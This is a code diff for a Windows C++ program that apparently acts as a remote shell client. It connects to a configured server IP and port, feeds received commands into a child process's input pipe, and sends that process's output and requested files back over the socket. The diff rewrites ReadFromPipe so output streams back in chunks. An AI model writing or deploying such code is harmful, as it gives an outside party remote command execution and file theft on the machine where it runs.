@@ -13,10 +13,11 @@ char * server_ip;
 int server_port;
 int interval;
 
+DWORD dwRead;
+
 SOCKET m_socket;
 
 static const int BUFFER_SIZE = 16 * 1024;
-#define BUFSIZE 16 * 1024
 
 using std::string;
 
@@ -26,7 +27,7 @@ HANDLE g_hChildStd_IN_Rd = NULL;
 HANDLE g_hChildStd_IN_Wr = NULL;
 
 void WriteToPipe(string msg);
-char* ReadFromPipe(void);
+void ReadFromPipe(void);
 
 static void SendFile(const char * fileName)
 {
@@ -122,11 +123,7 @@ int mainLoop() {
 	// Receives some test string to server...
 	while (true)
 	{
-		while (sendbuf[strlen(sendbuf) - 1] != ">"[0]) {
-			strcpy(sendbuf, ReadFromPipe());
-		}
-		bytesSent = send(m_socket, sendbuf, strlen(sendbuf), 0);
-		sendbuf[0] = 0;
+		ReadFromPipe();
 
 		bytesRecv = recv(m_socket, recvbuf, 16000, 0);
 		if (bytesRecv == 0 || bytesRecv == WSAECONNRESET)
@@ -143,6 +140,7 @@ int mainLoop() {
 				SendFile(path);
 			}
 			WriteToPipe(recvbuf);
+			recvbuf[0] = 0;
 		}
 
 	}
@@ -214,22 +212,37 @@ void WriteToPipe(string msg)
 	WriteFile(g_hChildStd_IN_Wr, msg.c_str(), msg.size(), NULL, NULL);
 }
 
-char* ReadFromPipe(void)
+void ReadFromPipe(void)
 {
-	DWORD numread = 0;
-	DWORD dwRead;
-	CHAR chBuf[BUFSIZE];
+	const int BUFSIZE = 512;
+	DWORD maxReadSize = 512;
+	DWORD readSize = 0;
+	int itNum = 0;
+	DWORD sessionRead;
 	BOOL bSuccess = FALSE;
-	HANDLE hParentStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
-	CHAR oldChBuf[BUFSIZE] = "";
+	BOOL hasBeenRead = false;
+	Sleep(333);
+
 	for (;;)
 	{
-		Sleep(250);
-		PeekNamedPipe(g_hChildStd_OUT_Rd, chBuf, BUFSIZE, &dwRead, NULL, NULL);
-		numread = dwRead;
-		if (strcmp(chBuf, oldChBuf) == 0) break;
-		strcpy(oldChBuf, chBuf);
+		CHAR chBuf[BUFSIZE];
+		PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, maxReadSize, &readSize, NULL, NULL);
+		if (hasBeenRead && readSize <= 0) break;
+		if (readSize > 0) {
+			hasBeenRead = true; //read in at least 1 byte :)
+		}
+		bSuccess = ReadFile(g_hChildStd_OUT_Rd, chBuf, readSize, &sessionRead, NULL);
+		if (!bSuccess || sessionRead <= 0) break;
+		dwRead += sessionRead;
+		if (readSize < maxReadSize) {
+			chBuf[readSize] = 0;
+		}
+		send(m_socket, chBuf, readSize, 0);
+		memset(&chBuf[0], 0, sizeof(chBuf));
+		if (itNum > 100) {
+			maxReadSize /= 2;
+			itNum = 0;
+		}
+		itNum++;
 	}
-	chBuf[numread] = 0;
-	return chBuf;
 }
